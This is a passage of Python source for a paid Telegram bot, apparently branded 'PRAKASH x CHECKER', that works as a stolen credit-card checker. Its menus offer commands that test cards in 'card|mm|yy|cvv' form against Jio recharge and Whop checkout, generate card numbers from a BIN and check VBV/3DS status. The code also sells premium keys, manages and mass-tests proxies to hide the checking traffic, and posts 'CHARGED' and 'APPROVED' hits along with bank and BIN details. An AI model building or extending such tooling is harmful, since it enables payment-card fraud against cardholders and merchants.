        f"{premium_emoji_tag('📱')} **{bold_sans('Jio Recharge')}** ➔ `/jio phone card|mm|yy|cvv`\n"
        f"{premium_emoji_tag('🛒')} **{bold_sans('Whop Checkout')}** ➔ `/whop url card|mm|yy|cvv`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('👑')} *{bold_sans('Premium/Paid users only.')}*"
    )
    buttons = [[InlineKeyboardButton(text="Back to Menu", callback_data="menu_main", api_kwargs={"style": "primary", "icon_custom_emoji_id": "6206505206197261313"})]]
    return text, InlineKeyboardMarkup(buttons)

def get_profile_menu(user_id, username):
    premium_data = _load_json(PREMIUM_DATA_FILE)
    expiry = premium_data.get(str(user_id), {}).get('expiry', 0)
    is_prem = False
    expiry_str = "Expired/Free"
    if expiry > time.time():
        is_prem = True
        expiry_str = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M')
    elif user_id == OWNER_ID:
        is_prem = True
        expiry_str = "Lifetime (Owner)"
    status_str = f"{premium_emoji_tag('👑')} {bold_sans('Premium')}" if is_prem else f"{premium_emoji_tag('❌')} {bold_sans('Free User')}"
    expiry_str_styled = bold_sans(expiry_str)
    proxies = load_user_proxies(user_id)
    proxy_count = len(proxies)
    text = (
        f"{premium_emoji_tag('🎭')} **{bold_sans('USER PROFILE')}** {premium_emoji_tag('🎭')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('👤')} **{bold_sans('Username')}** ➔ @{username}\n"
        f"{premium_emoji_tag('🆔')} **{bold_sans('User ID')}** ➔ {{{{code:{user_id}}}}}\n"
        f"{premium_emoji_tag('✨')} **{bold_sans('Status')}** ➔ {status_str}\n"
        f"{premium_emoji_tag('⌛')} **{bold_sans('Expiry')}** ➔ {{{{code:{expiry_str_styled}}}}}\n"
        f"{premium_emoji_tag('🌐')} **{bold_sans('Saved Proxies')}** ➔ {bold_sans(str(proxy_count))}"
        f"{' (' + bold_sans('auto-fetch ON') + ')' if proxy_count == 0 else ''}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    buttons = [[InlineKeyboardButton(text="Back to Menu", callback_data="menu_main", api_kwargs={"style": "primary", "icon_custom_emoji_id": "6206505206197261313"})]]
    return text, InlineKeyboardMarkup(buttons)

def get_pricing_menu():
    text = (
        f"{premium_emoji_tag('💎')} **{bold_sans('PRICING & PLANS')}** {premium_emoji_tag('💎')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('🔥')} **{bold_sans('Premium Key Rates')}**:\n"
        f" ➔ {bold_sans('7 Days')} ➔ **{bold_sans('$5')}**\n"
        f" ➔ {bold_sans('30 Days')} ➔ **{bold_sans('$15')}**\n"
        f" ➔ {bold_sans('Lifetime')} ➔ **{bold_sans('$50')}**\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('👑')} {bold_sans('Contact')} {{{{link|tg://user?id=7622071677|{bold_sans('『 PRAKASH 』')}}}}} {bold_sans('to purchase keys.')}"
    )
    buttons = [[InlineKeyboardButton(text="Back to Menu", callback_data="menu_main", api_kwargs={"style": "primary", "icon_custom_emoji_id": "6206505206197261313"})]]
    return text, InlineKeyboardMarkup(buttons)

def get_tools_menu():
    text = (
        f"{premium_emoji_tag('🛠️')} **{bold_sans('UTILITIES & TOOLS')}** {premium_emoji_tag('🛠️')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('🔌')} **{bold_sans('Proxy Commands')}**:\n"
        f" ➔ `/addpxy <proxy>` ➔ {bold_sans('Add single proxy')}\n"
        f" ➔ `/proxy` ➔ {bold_sans('View saved proxies')}\n"
        f" ➔ `/chkpxy` ➔ {bold_sans('Re-check & remove dead')}\n"
        f" ➔ `/mpxy` ➔ {bold_sans('Mass proxy check (text/file)')}\n"
        f" ➔ `/rmpxy <index|all>` ➔ {bold_sans('Remove proxy')}\n\n"
        f"{premium_emoji_tag('🔍')} **{bold_sans('Extra Tools')}**:\n"
        f" ➔ `/url <site>` ➔ {bold_sans('Analyze site gateway & platform')}\n"
        f" ➔ `/gen <bin>` ➔ {bold_sans('Generate 10 CCs from BIN')}\n"
        f" ➔ `/vbv <card>` ➔ {bold_sans('VBV / 3DS2 Checker')}\n\n"
        f"{premium_emoji_tag('ℹ️')} *{bold_sans('All commands work as reply to a card!')}*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    buttons = [[InlineKeyboardButton(text="Back to Menu", callback_data="menu_main", api_kwargs={"style": "primary", "icon_custom_emoji_id": "6206505206197261313"})]]
    return text, InlineKeyboardMarkup(buttons)


# ==================== KEY GENERATION ====================
def _generate_key():
    return f"PRAKASH-{''.join(random.choices(string.ascii_uppercase + string.digits, k=15))}"

async def generate_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Only the owner can generate keys.")
        return
    try:
        parts = update.message.text.split()
        count, days = int(parts[1]), int(parts[2])
    except (IndexError, ValueError):
        clean, ents = build_entities_with_custom_emojis(f"Usage: {{{{code:/key <count> <days>}}}}\nExample: {{{{code:/key 5 7}}}}")
        await update.message.reply_text(clean, entities=ents)
        return
    if count < 1 or count > 50 or days < 1 or days > 365:
        await update.message.reply_text("Invalid count or days (1-50 count, 1-365 days).")
        return
    keys_data = _load_json(KEYS_FILE)
    generated = []
    for _ in range(count):
        key = _generate_key()
        while key in keys_data:
            key = _generate_key()
        keys_data[key] = {'days': days, 'used': False}
        generated.append(key)
    _save_json(KEYS_FILE, keys_data)
    
    keys_list_str = "\n".join(f" ➔ {{{{code:{k}}}}}" for k in generated)
    msg = (
        f"{premium_emoji_tag('🧬')} **{bold_sans('KEYS GENERATED')}** {premium_emoji_tag('✅')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('⭐️')} **{bold_sans('Count')}** ➔ **{bold_sans(str(count))}**\n"
        f"{premium_emoji_tag('🔥')} **{bold_sans('Plan')}** ➔ **{bold_sans(str(days) + ' days Plan')}**\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('✅')} **{bold_sans('Keys List')}**:\n"
        f"{keys_list_str}"
    )
    clean, ents = build_entities_with_custom_emojis(msg)
    await update.message.reply_text(clean, entities=ents)

async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if int(user_id) != OWNER_ID and is_premium(user_id):
        clean, ents = build_entities_with_custom_emojis(
            f"{premium_emoji_tag('❌')} **{bold_sans('Active Premium Found!')}**\n"
            f"You cannot redeem a new key until your current subscription expires."
        )
        await update.message.reply_text(clean, entities=ents)
        return
    try:
        key = update.message.text.split(' ', 1)[1].strip()
    except IndexError:
        clean, ents = build_entities_with_custom_emojis(f"Usage: {{{{code:/redeem YOUR-KEY-HERE}}}}")
        await update.message.reply_text(clean, entities=ents)
        return
    if not key:
        clean, ents = build_entities_with_custom_emojis(f"Usage: {{{{code:/redeem YOUR-KEY-HERE}}}}")
        await update.message.reply_text(clean, entities=ents)
        return
    keys_data = _load_json(KEYS_FILE)
    if key not in keys_data or keys_data[key].get('used', False):
        clean, ents = build_entities_with_custom_emojis(f"{premium_emoji_tag('❌')} Invalid or already used key.")
        await update.message.reply_text(clean, entities=ents)
        return
    days = keys_data[key]['days']
    keys_data[key]['used'] = True
    keys_data[key]['used_by'] = user_id
    _save_json(KEYS_FILE, keys_data)
    prem = _load_json(PREMIUM_DATA_FILE)
    now = time.time()
    new_expiry = max(prem.get(str(user_id), {}).get('expiry', 0), now) + days * 86400
    prem[str(user_id)] = {'expiry': new_expiry}
    _save_json(PREMIUM_DATA_FILE, prem)
    
    expiry_date_str = datetime.fromtimestamp(new_expiry).strftime('%Y-%m-%d %H:%M')
    expiry_date_styled = bold_sans(expiry_date_str)
    msg = (
        f"{premium_emoji_tag('✅')} **{bold_sans('PREMIUM ACTIVATED!')}**\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('🔑')} **{bold_sans('Key')}** ➔ {{{{code:{key}}}}}\n"
        f"{premium_emoji_tag('📅')} **{bold_sans('Duration')}** ➔ {bold_sans(str(days))} {bold_sans('day(s)')}\n"
        f"{premium_emoji_tag('⌛')} **{bold_sans('Expires')}** ➔ {{{{code:{expiry_date_styled}}}}}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('🎉')} {bold_sans('Enjoy your Premium Access!')}"
    )
    clean, ents = build_entities_with_custom_emojis(msg)
    await update.message.reply_text(clean, entities=ents)

# ==================== PROXY COMMANDS ====================
def parse_proxy(proxy_str: str) -> str:
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None
    original_scheme = "http"
    for scheme in ("http://", "https://", "socks5://", "socks4://"):
        if proxy_str.lower().startswith(scheme):
            original_scheme = scheme.split("://")[0]
            proxy_str = proxy_str[len(scheme):]
            break

    # Format 1: user:pass@host:port
    if "@" in proxy_str:
        parts = proxy_str.split("@")
        if len(parts) == 2:
            auth, netloc = parts
            auth_parts = auth.split(":")
            netloc_parts = netloc.split(":")
            if len(auth_parts) == 2 and len(netloc_parts) == 2:
                user, password = auth_parts
                host, port = netloc_parts
                return f"{original_scheme}://{user}:{password}@{host}:{port}"

    # Split by ':'
    pp = proxy_str.split(':')
    # Format 2: host:port:user:pass
    if len(pp) == 4:
        return f"{original_scheme}://{pp[2]}:{pp[3]}@{pp[0]}:{pp[1]}"
    # Format 3: host:port
    elif len(pp) == 2:
        return f"{original_scheme}://{pp[0]}:{pp[1]}"
    
    return None

async def _test_proxy(proxy_str, max_retries=2):
    import httpx
    proxy_url = parse_proxy(proxy_str)
    if not proxy_url:
        return {'proxy': proxy_str, 'status': 'dead', 'error': 'Invalid format'}

    for attempt in range(max_retries):
        try:
            async with httpx.AsyncClient(proxy=proxy_url, timeout=30.0, verify=False) as client:
                # Try multiple endpoints — if ANY works, proxy is alive
                for url in [
                    'https://ipinfo.io/json',
                    'https://api.ipify.org?format=json',
                    'http://ip-api.com/json',
                ]:
                    try:
                        r = await client.get(url)
                        if r.status_code == 200:
                            data = r.json()
                            ip = data.get('ip', data.get('query', '?'))
                            country = data.get('country', data.get('country_name', 'Unknown'))
                            if ip and ip != '?':
                                return {
                                    'proxy': proxy_url,
                                    'status': 'alive',
                                    'ip': ip,
                                    'country': country
                                }
                    except Exception:
                        continue
        except Exception:
            pass
        # Wait before retry
        if attempt < max_retries - 1:
            await asyncio.sleep(2)

    return {'proxy': proxy_str, 'status': 'dead', 'error': 'All tests failed'}

async def add_single_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    track_user(user_id)
    if len(update.message.text.split()) < 2:
        clean, ents = build_entities_with_custom_emojis(f"Usage: {{{{code:/addpxy ip:port:user:pass}}}}")
        await update.message.reply_text(clean, entities=ents)
        return
    proxy_str = update.message.text.split(' ', 1)[1].strip()
    
    parsed = parse_proxy(proxy_str)
    if not parsed:
        clean, ents = build_entities_with_custom_emojis(f"{premium_emoji_tag('❌')} Invalid proxy format.")
        await update.message.reply_text(clean, entities=ents)
        return

    current = load_user_proxies(user_id)
    if parsed in current or proxy_str in current:
        clean, ents = build_entities_with_custom_emojis(f"{premium_emoji_tag('⚠️')} Proxy already exists.")
        await update.message.reply_text(clean, entities=ents)
        return
        
    init_msg = f"{premium_emoji_tag('⏳')} Checking..."
    clean_init, ents_init = build_entities_with_custom_emojis(init_msg)
    status_msg = await update.message.reply_text(clean_init, entities=ents_init)

    result = await _test_proxy(proxy_str)
    if result['status'] == 'alive':
        current.append(result['proxy'])
        save_user_proxies(user_id, current)
        msg = f"{premium_emoji_tag('✅')} Proxy Added!\n\n{{{{code:{result['proxy']}}}}}\nIP: {result.get('ip', '?')} | Country: {result.get('country', '?')}\nTotal: {len(current)}"
        clean, ents = build_entities_with_custom_emojis(msg)
        await status_msg.edit_text(clean, entities=ents)
    else:
        msg = f"{premium_emoji_tag('❌')} Proxy is DEAD!\n\n{{{{code:{proxy_str}}}}}"
        clean, ents = build_entities_with_custom_emojis(msg)
        await status_msg.edit_text(clean, entities=ents)



async def view_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    proxies = load_user_proxies(user_id)
    if not proxies:
        clean, ents = build_entities_with_custom_emojis(f"{premium_emoji_tag('❌')} No proxies. Use {{{{code:/addpxy}}}}.")
        await update.message.reply_text(clean, entities=ents)
        return
    msg = f"{premium_emoji_tag('🌐')} Your Proxies ({len(proxies)}):\n\n" + "\n".join(f"{i+1}. {{{{code:{p}}}}}" for i, p in enumerate(proxies))
    clean, ents = build_entities_with_custom_emojis(msg)
    await update.message.reply_text(clean, entities=ents)

async def check_proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    proxies = load_user_proxies(user_id)
    if not proxies:
        clean, ents = build_entities_with_custom_emojis(f"{premium_emoji_tag('❌')} No proxies to check.")
        await update.message.reply_text(clean, entities=ents)
        return
    init_msg = f"{premium_emoji_tag('⏳')} Checking {len(proxies)} proxies..."
    clean_init, ents_init = build_entities_with_custom_emojis(init_msg)
    status_msg = await update.message.reply_text(clean_init, entities=ents_init)
    results = await asyncio.gather(*[_test_proxy(p) for p in proxies])
    alive = [r for r in results if r['status'] == 'alive']
    dead = [r for r in results if r['status'] == 'dead']
    save_user_proxies(user_id, [r['proxy'] for r in alive])
    msg = f"{premium_emoji_tag('✅')} Proxy Check Done!\n\nTotal: {len(proxies)} | {premium_emoji_tag('✅')} Alive: {len(alive)} | {premium_emoji_tag('❌')} Removed: {len(dead)}"
    if alive:
        msg += f"\n\n{premium_emoji_tag('✅')} Active:\n" + "\n".join(f"{{{{code:{r['proxy']}}}}} — {r.get('ip','?')}" for r in alive[:10])
    clean, ents = build_entities_with_custom_emojis(msg)
    await status_msg.edit_text(clean, entities=ents)

# ==================== MASS PROXY CHECK ====================
async def _run_mass_proxy_check(update, user_id, proxies_raw, bot):
    """Mass proxy check with concurrency, stop button, and auto-save live to user DB."""
    proxies_raw = list(dict.fromkeys(proxies_raw))  # deduplicate
    total = len(proxies_raw)

    init_msg = f"{premium_emoji_tag('⏳')} Starting mass proxy check for {total} proxies..."
    clean_init, ents_init = build_entities_with_custom_emojis(init_msg)
    status_msg = await update.message.reply_text(clean_init, entities=ents_init)

    session_key = f"pxy_{user_id}_{status_msg.message_id}"
    active_sessions[session_key] = {'paused': False, 'stopped': False}

    alive_list = []
    dead_count = 0
    checked_count = 0
    sem = asyncio.Semaphore(10)

    async def check_one(proxy_str):
        nonlocal checked_count, dead_count
        try:
            s = active_sessions.get(session_key)
            if not s or s.get('stopped'):
                return
            async with sem:
                s = active_sessions.get(session_key)
                if not s or s.get('stopped'):
                    return
                while s and s.get('paused') and not s.get('stopped'):
                    await asyncio.sleep(0.5)
                    s = active_sessions.get(session_key)
                if not s or s.get('stopped'):
                    return
                result = await _test_proxy(proxy_str)
                s = active_sessions.get(session_key)
                if not s or s.get('stopped'):
                    return
                checked_count += 1
                if result['status'] == 'alive':
                    alive_list.append(result)
                    # No limit — keep checking all proxies
                else:
                    dead_count += 1
                if checked_count % 5 == 0 or checked_count == total:
                    pct = int((checked_count / total) * 100)
                    bar = "●" * (pct // 10) + "○" * (10 - pct // 10)
                    prog_raw = (
                        f"{premium_emoji_tag('🌐')} **𝐏𝐑𝐎𝐗𝐘 𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆** {premium_emoji_tag('🌐')}\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"{premium_emoji_tag('📈')} **Progress** ➔ {bar} [{pct}%]\n"
                        f"{premium_emoji_tag('📝')} **Checked** ➔ {checked_count} / {total}\n"
                        f"{premium_emoji_tag('✅')} **Alive** ➔ {len(alive_list)}\n"
                        f"{premium_emoji_tag('❌')} **Dead** ➔ {dead_count}\n"
                        f"{premium_emoji_tag('⏳')} **Remaining** ➔ {total - checked_count}\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━"
                    )
                    p_text, p_ents = build_entities_with_custom_emojis(prog_raw)
                    buttons = [
                        [InlineKeyboardButton(text="Stop", callback_data=f"pxystop_{session_key}", api_kwargs={"icon_custom_emoji_id": "6001440193058444284"})]
                    ]
                    try:
                        await bot.edit_message_text(chat_id=update.effective_chat.id, message_id=status_msg.message_id, text=p_text, entities=p_ents, reply_markup=InlineKeyboardMarkup(buttons))
                    except Exception:
                        pass
        except Exception:
            pass

    await asyncio.gather(*[check_one(p) for p in proxies_raw])

    was_stopped = not active_sessions.get(session_key) or active_sessions.get(session_key, {}).get('stopped')

    # Save live proxies to user's DB
    if alive_list:
        current_proxies = load_user_proxies(user_id)
        current_set = set(current_proxies)
        added = 0
        for r in alive_list:
            if r['proxy'] not in current_set:
                current_proxies.append(r['proxy'])
                current_set.add(r['proxy'])
                added += 1
        save_user_proxies(user_id, current_proxies)

    if was_stopped:
        stop_note = f"\n{premium_emoji_tag('🛑')} Stopped by user!"
    else:
        stop_note = ""
        
    added_note = f"\n{premium_emoji_tag('💾')} Auto-saved {len(alive_list)} live proxies to your DB!" if alive_list else ""
    final_raw = (
        f"{premium_emoji_tag('🌐')} **Proxy Check Complete**\n\n"
        f"{premium_emoji_tag('📝')} **Total:** {total}\n"
        f"{premium_emoji_tag('✅')} **Alive:** {len(alive_list)}\n"
        f"{premium_emoji_tag('❌')} **Dead:** {dead_count}\n"
        f"{premium_emoji_tag('📊')} **Checked:** {checked_count}{stop_note}{added_note}"
    )
    f_text, f_ents = build_entities_with_custom_emojis(final_raw)
    try:
        await bot.edit_message_text(chat_id=update.effective_chat.id, message_id=status_msg.message_id, text=f_text, entities=f_ents)
    except Exception:
        pass

    active_sessions.pop(session_key, None)

async def mpxy_mass_proxy_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass proxy check from text reply or inline text (like /msh for cards)."""
    user_id = update.effective_user.id
    track_user(user_id)
    proxy_text = ""
    if update.message.reply_to_message:
        if update.message.reply_to_message.document:
            doc = update.message.reply_to_message.document
            if doc.file_name and doc.file_name.endswith('.txt'):
                path = f"temp_pxy_{user_id}.txt"
                try:
                    await download_telegram_file(context.bot, doc.file_id, path)
                    async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
                        proxy_text = await f.read()
                except Exception as e:
                    await update.message.reply_text(f"❌ Failed to download proxy file: {str(e)}")
                    return
                finally:
                    if os.path.exists(path):
                        try:
                            os.remove(path)
                        except Exception:
                            pass
        elif update.message.reply_to_message.text:
            proxy_text = update.message.reply_to_message.text
    if not proxy_text and '\n' in update.message.text:
        proxy_text = update.message.text.split('\n', 1)[1]
    if not proxy_text.strip():
        clean, ents = build_entities_with_custom_emojis(
            f"{premium_emoji_tag('❌')} No proxies found. Use:\n"
            f"{{{{code:/mpxy}}}}\n"
            f"{{{{code:ip:port:user:pass}}}}\n"
            f"{{{{code:ip:port:user:pass}}}}\n\n"
            f"Or reply to a text/file with {{{{code:/mpxy}}}}"
        )
        await update.message.reply_text(clean, entities=ents)
        return
    proxies_raw = [l.strip() for l in proxy_text.splitlines() if l.strip()]
    # Filter out lines that look like commands or non-proxy text
    proxies_raw = [p for p in proxies_raw if ':' in p and not p.startswith('/')]
    if not proxies_raw:
        clean, ents = build_entities_with_custom_emojis(f"{premium_emoji_tag('❌')} No valid proxies found.")
        await update.message.reply_text(clean, entities=ents)
        return
    await _run_mass_proxy_check(update, user_id, proxies_raw, context.bot)

async def remove_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    track_user(user_id)
    if len(update.message.text.split()) < 2:
        clean, ents = build_entities_with_custom_emojis(f"Usage: {{{{code:/rmpxy <index>}}}} or {{{{code:/rmpxy all}}}}")
        await update.message.reply_text(clean, entities=ents)
        return
    arg = update.message.text.split(' ', 1)[1].strip().lower()
    proxies = load_user_proxies(user_id)
    if not proxies:
        clean, ents = build_entities_with_custom_emojis(f"{premium_emoji_tag('❌')} No proxies.")
        await update.message.reply_text(clean, entities=ents)
        return
    if arg == 'all':
        count = len(proxies)
        save_user_proxies(user_id, [])
        clean, ents = build_entities_with_custom_emojis(f"{premium_emoji_tag('✅')} Cleared all {count} proxies.")
        await update.message.reply_text(clean, entities=ents)
        return
    removed = []
    try:
        indices = [int(x)-1 for x in arg.split(',')]
        for idx in sorted(set(indices), reverse=True):
            if 0 <= idx < len(proxies):
                removed.append(proxies.pop(idx))
    except ValueError:
        if arg in proxies:
            proxies.remove(arg)
            removed.append(arg)
    if not removed:
        clean, ents = build_entities_with_custom_emojis(f"{premium_emoji_tag('❌')} Proxy not found.")
        await update.message.reply_text(clean, entities=ents)
        return
    save_user_proxies(user_id, proxies)
    msg = f"{premium_emoji_tag('✅')} Removed {len(removed)} proxy(s).\nRemaining: {len(proxies)}"
    clean, ents = build_entities_with_custom_emojis(msg)
    await update.message.reply_text(clean, entities=ents)

async def remove_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    track_user(user_id)
    if len(update.message.text.split()) < 2:
        await update.message.reply_text("Usage: `/rm https://site.com`")
        return
    url = update.message.text.split(' ', 1)[1].strip()
    sites = load_sites()
    if url not in sites:
        await update.message.reply_text(f"{premium_emoji_tag('❌')} Site not found.")
        return
    new_sites = [s for s in sites if s != url]
    async with aiofiles.open(SITES_FILE, 'w', encoding='utf-8') as f:
        for s in new_sites:
            await f.write(f"{s}\n")
    msg = f"{premium_emoji_tag('✅')} Removed {{{{code:{url}}}}}"
    clean, ents = build_entities_with_custom_emojis(msg)
    await update.message.reply_text(clean, entities=ents)

# ==================== GROUP HIT LOG (NO CC/BIN — PUBLIC SAFE) ====================
async def send_group_hit_log(bot, hit_type, gateway, price, response_msg, username, user_id):
    """Send hit notification to the hit log group. Format matches PRAKASH x CHK style."""
    if not HIT_LOG_GROUP_ID:
        return

    prem_tag = "[PREMIUM 👑]" if is_premium(user_id) else "[FREE]"

    if hit_type == 'Charged':
        hit_label = 'CHARGED'
    else:
        hit_label = 'APPROVED'

    resp_short = str(response_msg).strip()[:80]
    price_str = str(price) if price and price != '-' else '$0.00'

    log_raw = (
        f"╭ HIT ⇒ {hit_label} ╮\n"
        f"⚡ Gateway ⇒ {gateway} {price_str}\n"
        f"⚡ Response ⇒ {resp_short}\n"
        f"👤 User ⇒ {username} {prem_tag}\n"
        f"╰ Checker ⇒ PRAKASH x CHECKER"
    )
    try:
        await bot.send_message(HIT_LOG_GROUP_ID, log_raw, disable_web_page_preview=True)
    except Exception:
        pass

# ==================== HIT NOTIFICATION, PROGRESS, FINAL RESULTS ====================
async def send_realtime_hit(chat_id, result, hit_type, username, bot, user_id):
    if hit_type == "Charged":
        status_text = f"{premium_emoji_tag('🔥')} 𝐂𝐇𝐀𝐑𝐆𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 {premium_emoji_tag('🔥')}"
    else:
        status_text = f"{premium_emoji_tag('✨')} 𝐂𝐀𝐑𝐃 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 {premium_emoji_tag('✨')}"
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    resp_safe = str(result['message'])[:150]
    gate_display = result.get('gateway', 'Unknown')
    price = result.get('price', '-')
    bin_details = f"{brand} - {bin_type} - {level}"
    message_raw = (
        f"{premium_emoji_tag('💎')} **𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃** {premium_emoji_tag('💎')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{status_text}\n\n"
        f"{premium_emoji_tag('💳')} 𝐂𝐚𝐫𝐝: {{{{spoiler:{result['card']}}}}}\n"
        f"{premium_emoji_tag('🛡️')} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gate_display}\n"
        f"{premium_emoji_tag('💰')} 𝐀𝐦𝐨𝐮𝐧𝐭: {price}\n"
        f"{premium_emoji_tag('💬')} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {resp_safe}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('ℹ️')} 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨:\n"
        f"  {premium_emoji_tag('🌍')} 𝐁𝐈𝐍: {{{{pre:{bin_details}}}}}\n"
        f"  {premium_emoji_tag('🏦')} 𝐁𝐚𝐧𝐤: {bank}\n"
        f"  {premium_emoji_tag('🏳️')} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country} {flag}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('👤')} 𝐔𝐬𝐞𝐫: {{{{link|tg://user?id={user_id}|{bold_sans(username)}}}}}\n"
        f"{premium_emoji_tag('👑')} 𝐎𝐰𝐧𝐞𝐫: {{{{link|tg://user?id=7622071677|{bold_sans('『 PRAKASH 』')}}}}}"
    )
    msg_text, msg_entities = build_entities_with_custom_emojis(message_raw)
    # Add Receipt button for Charged hits in mass check
    _receipt_url = result.get('receipt_url', '')
    _reply_markup = None
    if hit_type == 'Charged' and _receipt_url:
        _reply_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton(text="📜 Receipt", url=_receipt_url)]
        ])
    try:
        await bot.send_message(chat_id, msg_text, entities=msg_entities, disable_web_page_preview=True, reply_markup=_reply_markup)
    except:
        pass


async def update_progress(chat_id, message_id, results, current, bot):
    total = results['total']
    pct = int((current / total) * 100) if total else 0
    bar = "●" * (pct//10) + "○" * (10 - pct//10)
    last_resp = results.get('last_response', '-')
    last_card = results.get('last_card', '')
    card_spoiler = f'{{{{spoiler:{last_card}}}}}' if last_card else 'Waiting...'
    session_key = f"{chat_id}_{message_id}"
    status_str = "Paused..." if active_sessions.get(session_key, {}).get('paused') else "Checking CCs..."
    progress_raw = (
        f"{premium_emoji_tag('⚡')} **𝐂𝐂 𝐂𝐇𝐄𝐂𝐊 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒** {premium_emoji_tag('⚡')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('⏳')} **Status** ➔ {status_str}\n"
        f"{premium_emoji_tag('📈')} **Progress** ➔ {bar} [{pct}%]\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('💳')} **Last CC** ➔ {card_spoiler}\n"
        f"{premium_emoji_tag('💬')} **Response** ➔ {last_resp[:45]}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('📝')} **Checked** ➔ {current} / {total}\n"
        f"{premium_emoji_tag('💎')} **Charged** ➔ {len(results['charged'])}\n"
        f"{premium_emoji_tag('✅')} **Approved** ➔ {len(results['approved'])}\n"
        f"{premium_emoji_tag('❌')} **Declined** ➔ {len(results['dead'])}\n"
        f"{premium_emoji_tag('⚠️')} **Skipped** ➔ {results.get('skipped_count', 0)}\n"
        f"{premium_emoji_tag('⏳')} **Remaining** ➔ {total - current}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('👤')} **Checked By** ➔ \u300e {results.get('username', 'User')} \u300f"
    )
    p_text, p_ents = build_entities_with_custom_emojis(progress_raw)
    buttons = [
        [
            InlineKeyboardButton(text="Pause", callback_data="pause", api_kwargs={"icon_custom_emoji_id": "6001440193058444284"}),
            InlineKeyboardButton(text="Resume", callback_data="resume", api_kwargs={"icon_custom_emoji_id": "6285315214673975495"})
        ],
        [InlineKeyboardButton(text="Stop", callback_data="stop", api_kwargs={"icon_custom_emoji_id": "6001440193058444284"})]
    ]
    try:
        await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=p_text, entities=p_ents, reply_markup=InlineKeyboardMarkup(buttons))
    except:
        pass

async def send_final_results(chat_id, results, bot):
    elapsed = int(time.time() - results['start_time'])
    h, m, s = elapsed//3600, (elapsed%3600)//60, elapsed%60
    hits = []
    for r in results['charged'][:5]:
        hits.append(f"{premium_emoji_tag('💎')} {{{{code:Charged}}}} ➔ {{{{spoiler:{r['card']}}}}}")
    for r in results['approved'][:5]:
        hits.append(f"{premium_emoji_tag('✅')} {{{{code:Approved}}}} ➔ {{{{spoiler:{r['card']}}}}}")
    hits_text = "\n".join(hits) if hits else "No hits found."
    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    summary_raw = (
        f"{premium_emoji_tag('🏁')} **𝐂𝐇𝐄𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄** {premium_emoji_tag('🏁')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('⚙️')} **Gateway** ➔ {gateway}\n"
        f"{premium_emoji_tag('⏱️')} **Time Taken** ➔ {h}h {m}m {s}s\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('📊')} **Stats**:\n"
        f" ➔ **Total** ➔ {results['total']}\n"
        f" ➔ **Charged** ➔ {len(results['charged'])}\n"
        f" ➔ **Approved** ➔ {len(results['approved'])}\n"
        f" ➔ **Declined** ➔ {len(results['dead'])}\n"
        f" ➔ **Skipped** ➔ {results.get('skipped_count', 0)}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('🔥')} **Top Hits**:\n{hits_text}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
